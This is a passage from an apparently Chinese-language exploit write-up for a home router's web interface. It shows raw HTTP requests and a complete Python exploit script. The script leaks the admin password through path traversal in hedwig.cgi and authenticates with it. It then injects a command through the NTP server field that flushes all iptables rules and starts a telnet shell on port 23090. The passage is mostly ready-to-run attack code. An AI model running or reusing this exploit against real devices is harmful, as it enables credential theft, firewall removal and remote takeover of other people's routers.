<pre><code>POST /getcfg.php HTTP/1.1
Host: 192.168.0.1
User-Agent: python-requests/2.18.4
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: uid=0764udul3Z
Content-Length: 20
Content-Type: application/x-www-form-urlencoded

SERVICES=DEVICE.TIME</code></pre>
<p>收到回应<br/>
<img src="https://img-blog.csdnimg.cn/20200330094741593.png"/><br/>
<code>$server = query("/device/time/ntp/server");</code>来获取.<br/>
<strong>用post /hedwig.cgi文件执行命令</strong><br/>
/hedwig.cgi文件会执行fatlady.php文件，设置service位和TDEVICE.TIME执行命令<br/>
<img src="https://img-blog.csdnimg.cn/20200330094852374.png"/><br/>
发送的报文如下</p>
<p><img src="http://q7zpzw8bq.bkt.clouddn.com/20200330094932283.png"/></p>
<p><strong>向pigwidgeon.cgi发送激活请求，使服务生效</strong><br/>
发送的报文</p>
<pre><code>POST /pigwidgeon.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: python-requests/2.18.4
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: uid=0764udul3Z
Content-Length: 25
Content-Type: application/x-www-form-urlencoded

ACTIONS=SETCFG%2CACTIVATE</code></pre>
<p>post   /pigwidgeon.cgi文件设置xml内容为 ACTIONS=SETCFG%2CACTIVATE可以激活一个服务</p>
<hr/>
<p><strong>0x03利用脚本</strong></p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
<span class="c1"># pylint: disable=C0103</span>
<span class="c1">#coding=utf-8</span>
<span class="c1"># pip3 install requests lxml</span>
<span class="c1">#</span>
<span class="kn">import</span> <span class="nn">hmac</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urljoin</span>
<span class="kn">from</span> <span class="nn">xml.sax.saxutils</span> <span class="kn">import</span> <span class="n">escape</span>
<span class="kn">import</span> <span class="nn">lxml.etree</span>
<span class="kn">import</span> <span class="nn">requests</span>



<span class="n">COMMAND</span> <span class="o">=</span> <span class="s2">";"</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
    <span class="s2">"iptables -F"</span><span class="p">,</span>  <span class="c1"># 清空指定链 chain 上面的所有规则。如果没有指定链，清空该表上所有链的所有规则。</span>
    <span class="s2">"iptables -X"</span><span class="p">,</span>  <span class="c1">#删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。如果没有指定链名，则会删除该表中所有非内置的链。</span>
    <span class="s2">"iptables -t nat -F"</span><span class="p">,</span>  <span class="c1">#对指定nat链表进行 -F操作</span>
    <span class="s2">"iptables -t nat -X"</span><span class="p">,</span>   <span class="c1"># 定义地址转换的，也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING</span>
    <span class="s2">"iptables -t mangle -F"</span><span class="p">,</span> <span class="c1">#修改报文原数据，是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</span>
    <span class="s2">"iptables -t mangle -X"</span><span class="p">,</span>
    <span class="s2">"iptables -P INPUT ACCEPT"</span><span class="p">,</span>  <span class="c1"># -P指定要匹配的数据包协议类型 INPUT链 ：处理输入数据包 ACCEPT ：接收数据包</span>
    <span class="s2">"iptables -P FORWARD ACCEPT"</span><span class="p">,</span><span class="c1">#FORWARD链 ：处理转发数据包。</span>
    <span class="s2">"iptables -P OUTPUT ACCEPT"</span><span class="p">,</span>   <span class="c1">#OUTPUT链 ：处理输出数据包。</span>
    <span class="s2">"telnetd -p 23090 -l /bin/date"</span>  <span class="c1"># 开启telnet服务。  之后执行命令：telnet 192.168.0.1 23090 拿到shell</span>
    <span class="p">])</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">pass</span>

<span class="n">TARGET</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
<span class="n">session</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span>

<span class="c1">############################################################获取用户名密码</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"Get password..."</span><span class="p">)</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"Content-Type"</span><span class="p">:</span> <span class="s2">"text/xml"</span><span class="p">}</span>
<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"uid"</span><span class="p">:</span> <span class="s2">"whatever"</span><span class="p">}</span>
<span class="n">data</span> <span class="o">=</span> <span class="s2">"""&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="s2">&lt;postxml&gt;</span>
<span class="s2">&lt;module&gt;</span>
<span class="s2">    &lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;</span>
<span class="s2">&lt;/module&gt;</span>
<span class="s2">&lt;/postxml&gt;"""</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">"./hedwig.cgi"</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="c1"># print(resp.text)</span>

<span class="c1"># getcfg: &lt;module&gt;...&lt;/module&gt;</span>
<span class="c1"># hedwig: &lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="c1">#       : &lt;hedwig&gt;...&lt;/hedwig&gt;</span>
<span class="n">accdata</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">[:</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">"&lt;?xml"</span><span class="p">)]</span>

<span class="n">admin_pasw</span> <span class="o">=</span> <span class="s2">""</span>

<span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">accdata</span><span class="p">)</span>
<span class="n">accounts</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">"/module/device/account/entry"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">acc</span> <span class="ow">in</span> <span class="n">accounts</span><span class="p">:</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">"name"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span>
    <span class="n">pasw</span> <span class="o">=</span> <span class="n">acc</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">"password"</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"name:"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"pass:"</span><span class="p">,</span> <span class="n">pasw</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="s2">"Admin"</span><span class="p">:</span>
        <span class="n">admin_pasw</span> <span class="o">=</span> <span class="n">pasw</span>

<span class="k">if</span> <span class="ow">not</span> <span class="n">admin_pasw</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Admin password not found!"</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>

<span class="c1">############################################################  通过/authentication.cgi获取key</span>
<span class="c1">#登录方式：</span>
<span class="c1">#1.发送get请求/authentication.cgi</span>
<span class="c1">#将获取到{"status": "ok", "errno": null, "uid": "MPxUAS6sZp",</span>
<span class="c1">#        "challenge": "c75a69e4-d1fe-4a47-b152-b494c9174316", "version": "0204"}</span>
<span class="c1">#2.使用uid键值对作为cookie，password与username+challenge作md5</span>
<span class="c1">#3.发送post请求到/authentication.cgi</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"Auth challenge..."</span><span class="p">)</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">"/authentication.cgi"</span><span class="p">))</span>
<span class="c1"># print(resp.text)</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
<span class="k">if</span> <span class="n">resp</span><span class="p">[</span><span class="s2">"status"</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">"ok"</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Failed!"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"uid:"</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">"uid"</span><span class="p">])</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"challenge:"</span><span class="p">,</span> <span class="n">resp</span><span class="p">[</span><span class="s2">"challenge"</span><span class="p">])</span>

<span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s2">"uid"</span><span class="p">:</span> <span class="n">resp</span><span class="p">[</span><span class="s2">"uid"</span><span class="p">]})</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"Auth login..."</span><span class="p">)</span>
<span class="n">user_name</span> <span class="o">=</span> <span class="s2">"Admin"</span>
<span class="n">user_pasw</span> <span class="o">=</span> <span class="n">admin_pasw</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">"id"</span><span class="p">:</span> <span class="n">user_name</span><span class="p">,</span>
    <span class="s2">"password"</span><span class="p">:</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">user_pasw</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="p">(</span><span class="n">user_name</span> <span class="o">+</span> <span class="n">resp</span><span class="p">[</span><span class="s2">"challenge"</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="s2">"md5"</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
<span class="p">}</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">"/authentication.cgi"</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="c1"># print(resp.text)</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
<span class="k">if</span> <span class="n">resp</span><span class="p">[</span><span class="s2">"status"</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">"ok"</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Failed!"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"OK"</span><span class="p">)</span>

<span class="c1">############################################################设置cookie：uid=MPxUAS6sZp</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"SERVICES"</span><span class="p">:</span> <span class="s2">"DEVICE.TIME"</span><span class="p">}</span>
<span class="c1"># POST /getcfg.php HTTP/1.1</span>
<span class="c1"># Host: 192.168.0.1</span>
<span class="c1"># User-Agent: python-requests/2.18.4</span>
<span class="c1"># Accept-Encoding: gzip, deflate</span>
<span class="c1"># Accept: */*</span>
<span class="c1"># Connection: keep-alive</span>
<span class="c1"># Cookie: uid=MPxUAS6sZp</span>
<span class="c1"># Content-Length: 20</span>
<span class="c1"># Content-Type: application/x-www-form-urlencoded</span>
<span class="c1">#</span>
<span class="c1"># SERVICES=DEVICE.TIME</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">"/getcfg.php"</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  <span class="c1">#文件执行</span>
<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

<span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>   <span class="c1">#设置要发送的xml文件的service字段和要执行的命令</span>
<span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">"//ntp/enable"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">"1"</span>
<span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">"//ntp/server"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">"metelesku; ("</span><span class="o">+</span><span class="n">COMMAND</span><span class="o">+</span><span class="s2">") &amp; exit; "</span>
<span class="n">tree</span><span class="o">.</span><span class="n">xpath</span><span class="p">(</span><span class="s2">"//ntp6/enable"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">text</span> <span class="o">=</span> <span class="s2">"1"</span>

<span class="c1">############################################################</span>
<span class="c1">#</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"hedwig"</span><span class="p">)</span>
<span class="c1">#hedwig.cgi文件里面执行fatlady.php文件，设置service位和TDEVICE.TIME可以执行执行TDEVICE.TIME.xml.php</span>
<span class="c1">#TDEVICE.TIME.xml.php文件可以执行命令</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"Content-Type"</span><span class="p">:</span> <span class="s2">"text/xml"</span><span class="p">}</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">tostring</span><span class="p">(</span><span class="n">tree</span><span class="p">)</span>
<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">"/hedwig.cgi"</span><span class="p">),</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="c1"># print(resp.text)</span>

<span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">"result"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">"ok"</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Failed!"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"OK"</span><span class="p">)</span>

<span class="c1">############################################################</span>
<span class="c1">#激活服务</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"pigwidgeon"</span><span class="p">)</span>

<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"ACTIONS"</span><span class="p">:</span> <span class="s2">"SETCFG,ACTIVATE"</span><span class="p">}</span>

<span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="s2">"/pigwidgeon.cgi"</span><span class="p">),</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="c1"># print(resp.text)</span>

<span class="n">tree</span> <span class="o">=</span> <span class="n">lxml</span><span class="o">.</span><span class="n">etree</span><span class="o">.</span><span class="n">fromstring</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">findtext</span><span class="p">(</span><span class="s2">"result"</span><span class="p">)</span>
<span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">!=</span> <span class="s2">"ok"</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"Failed!"</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"OK"</span><span class="p">)</span>
</pre></div>
</div>
</div>